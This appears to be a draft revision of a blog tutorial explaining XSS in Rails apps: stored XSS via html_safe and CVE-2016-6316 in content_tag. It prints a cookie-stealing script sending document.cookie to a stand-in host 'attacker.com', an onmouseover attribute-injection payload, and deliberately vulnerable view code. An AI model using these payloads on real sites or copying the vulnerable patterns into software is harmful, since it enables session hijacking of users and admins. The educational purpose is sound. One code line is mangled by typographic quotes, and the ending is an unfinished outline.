---
id: 439
title: Do I really need to upgrade my Rails apps? (make more specific to security advisories?)
date: 2016-10-16T13:41:03-04:00
author: Sid
layout: revision
guid: http://ducktypelabs.com/436-revision-v1/
permalink: /436-revision-v1/
---
Ruby and Rails security advisories, without exception, recommend that you upgrade your Rails app as soon as possible. If you&#8217;re strapped for time, it&#8217;s a totally understandable tendency to want to postpone upgrades and avoid extra work like fixing breaking tests unless absolutely necessary. Unfortunately, the descriptions of the problem being solved can be cryptic, and it can be hard to assess if you really need to do the upgrade.

In this article, we&#8217;re going to look at Rails &#8216;5.0.0.1/4.2.7.1/3.2.22.3\`, which fixes [CVE-2016-6316](https://groups.google.com/forum/#!topic/rubyonrails-security/I-VWr034ouk). The aim of this article is twofold:

  1. To go over the basics of XSS vulnerabilities, how they can be exploited, and ways to mitigate them. 
  2. To increase your understanding about the specific problem being solved with the Rails `5.0.0.1`/`4.2.7.1` release &#8211; an XSS vulnerability in `ActionView`

## What is an XSS Vulnerability?

&#8220;XSS&#8221; stands for cross-site scripting. When your application has an XSS vulnerability, attackers can run malicious Javascript on your users&#8217; browsers. For example, consider a Javascript snippet like the following:

    var i = new Image;
    i.src = "http://ducktypelabs.com/" + document.cookie;
    

The above snippet, when run on a user&#8217;s browser, will cause the browser to make a request to `ducktypelabs.com` and send over the user&#8217;s cookie. Using this cookie, the attacker can proceed to hijack the user&#8217;s session and gain unauthorized access to secured areas of your app.

## Types of XSS Vulnerabilities

There are three varieties of XSS:

  1. Reflected XSS
  2. Stored XSS
  3. DOM-based XSS

[Read this page for more info on the three types of XSS](https://www.owasp.org/index.php/Types_of_Cross-Site_Scripting)

For the purposes of this article, we will focus on Stored XSS, but there are commonalities amongst these.

## How to attack a Stored XSS Vulnerability?

A Stored XSS vulnerability arises when data submitted by one user (the attacker) is stored in the application and is then displayed to other users without being sanitized properly. Let&#8217;s consider an example to illustrate how such a vulnerability can arise and how an attacker can take advantage of it.

### A Vulnerable Rails app

Consider a typical Rails app, with users and admins. A user record has three fields &#8211; `name`, `email` and `introduction`. Each user has a profile page where this information is listed. Admins in the system, in addition to being able to access these profile pages, also have access to a `/users` page which consolidates all the users&#8217; information. The view code for this page starts out looking something like this:

    <% #This is accessible only to admins %>
    <% User.all.each do |user| %>
      <%= user.name %>
      <%= user.email %>
      <%= user.introduction %>
    <% end %>
    

Now let&#8217;s say we want to give our users the ability to customize their introductions with HTML. So instead of typing in `"I'm awesome!!"` in the introduction field, they can type in `"I'm <strong>awesome!!</strong>"`. To accomplish this in our view, we make use of the `html_safe` helper and change `user.introduction` to `user.introduction.html_safe`. Now, if a user submits text with HTML in it, our view will render the HTML.

Hopefully, you can see where we are going with this.

### Enter Attacker

An attacker can take advantage of this HTML rendering and submit something like this in the introduction field:

    I'm awesome!!
    <script>
      var i = new Image;
      i.src = "http://attacker.com/" + document.cookie;
    </script>
    

and have this stored in the database. Now, whenever an admin logs in and visits the `/users` page, the above script will run and the attacker will see the admin&#8217;s cookie in their server logs. Using this cookie, they can proceed to log in as the admin and further their agenda (malicious though it may be).

## Two common ways XSS vulnerabilities can be introduced with `html_safe`

The above example illustrates one straightforward way by which an XSS vulnerability can be introduced with `html_safe`. That is, using `html_safe` directly on user inputs because we want to give users the ability to customize how their input renders.

Another way using `html_safe` can cause XSS vulnerabilities to sneak up on you is when you find yourself needing to incorporate styling on strings which are derived from user input. Going back to our example Rails app&#8217;s `/users` page, let&#8217;s say we&#8217;ve installed [Font Awesome](http://fontawesome.io/) and we want to provide admins a nicely styled link to a given user&#8217;s profile page. We might do something like this in our view:

    <% User.all.each do |user| %>
      <%= link_to "<i class='fa fa-user'></i> #{user.name}".html_safe, users_profile_path(user) %>
      <%= user.email %>
      <%= user.introduction %>
    <% end %>
    

As in the previous example, this opens our admin&#8217;s account up to XSS attacks. By submitting javascript in the `name` field, an attacker can proceed to gain access to the admin&#8217;s account.

## But I need to use `html_safe`. How can I protect my app?

Here are a couple of ways:

  1. `html_safe` is an assertion. Use `html_safe` only on trusted strings. In other words, on strings that are not derived from user inputs. You can concatenate a string which is `html_safe` with a string which is not and be assured that the string which is not `html_safe` will be escaped properly. So for example, we can do:
    
    <%= link_to "<i class='fa fa-user'></i> &#8220;.html\_safe + &#8220;#{user.name}&#8221;, users\_profile_path(user) %>

which will ensure that `user.name` is properly escaped. So if we pass in a string like \`&#8221;Bob Foo to name, our HTML will look something like:

    <a href='...'><i class='fa fa-user'></i> Bob Foo&lt;script&gt;alert(document.cookie)&lt;/script&gt;</a>
    

as opposed to:

    <a href='...'><i class='fa fa-user'></i> Bob Foo <script>alert(document.cookie)</script></a>
    

which will prevent the Javascript from running.

  1. The [`sanitize`](http://api.rubyonrails.org/classes/ActionView/Helpers/SanitizeHelper.html) helper is another useful option. With `sanitize`, you can specify exactly what HTML tags and attributes you want to render and have it automatically reject anything else.

## Rails Views have XSS Protections

Rails (from version 3 onwards), by default, will escape any content in your views unless you specify that they are html_safe (either directly by calling `html_safe` on a string or indirectly with `sanitize`). `ActionView` helpers like `content_tag` also will, by default, escape strings that are passed in to them.

## CVE-2016-6316

As it turns out, inserting `<script>` tags into places where they won&#8217;t be escaped is just one of the many ways to exploit an XSS vulnerability. You (or an attacker) can also take advantage of the fact that Javascript can be called directly via HTML attributes such as `onclick`, `onmouseover` and others.

Let&#8217;s take a brief look at `content_tag` to examine how this can work in practice. Rails provides the `content_tag` helper to programmatically generate HTML tags. For example, to generate a `div` tag, you&#8217;d do something like this:

    content_tag(:div, "hi")
    

which in HTML would translate to:

    <div>hi</div>
    

You can pass in additional parameters to `content_tag` to specify tag attributes. So if we wanted to add a `title` attribute, we could say something like:

    content_tag(:div, "hi", title: "greeting")
    

which in HTML would translate to:

    <div title="greeting">hi</div>
    

Now, let&#8217;s say for some reason, our app has this `title` attribute tied to a user input. Meaning, if our user input is `foo`, the HTML generated by `content_tag` would be:

    <div title="foo">hi</div>
    

Assuming that there is no XSS protection enabled on `content_tag`, how would we exploit this?

We could send in a string like so: `"onmouseover="alert(document.cookie)`, which would result in HTML like the following:

<div title="" onmouseover="alert(document.cookie)">
  hi
</div>

The key character in our example input is the first double-quote character `"`. This double-quote, because it is not escaped, is treated by the browser as a closing quote and makes it so that the characters after the double-quote are treated as valid HTML.

**Rails, by default, will escape double-quotes, even in helpers like `content_tag`. Where CVE-2016-6316 comes in though, is when we mark our inputs to helpers like `content_tag` as `html_safe`.**

Let&#8217;s say we&#8217;re passing in user input from our controller to the view with the `@user_input` instance variable, and our call to `content_tag` looks like:

    <%= content_tag(:div, 'hi', title: @user_input) %>
    

If an attacker tries to pass in a string like `"onmouseover=...`, Rails will automatically escape the double quotes and prevent the XSS attack.

However, prior to Rails `4.2.7.1/5.0.0.1`, **if for some reason we marked the user input as `html_safe`:**

    <%= content_tag(:div, 'hi', title: @user_input.html_safe) %>
    

then **this would allow double-quotes to be rendered in the HTML without being escaped.** Which, as we&#8217;ve seen allows an attacker to execute arbitrary Javascript.

## So, should I upgrade?

The easy and correct answer is yes, you should upgrade.

That being said, I think it depends on how far away your version of Rails is from the most recently released patch. The closer you are, the easier the upgrade process will be. Security patches in general are designed not to cause breaking changes in your codebase, but that applies only if you&#8217;re at the most recent patch already.

If you&#8217;re strapped for time, it would behoove you to understand the problems that security advisories and related patches fix, so you can assess for yourself if your codebase is at risk and apply any mitigations necessary.

## Recommendations

The most important thing you can do is to keep yourself aware of security advisories as and when they are released.

  1. Recommendations (bundle-audit, bundle-audit update, brakeman, Rails security guide, subscribe to security advisories)
  2. Thanks to Obromios for asking this question and reviewing this article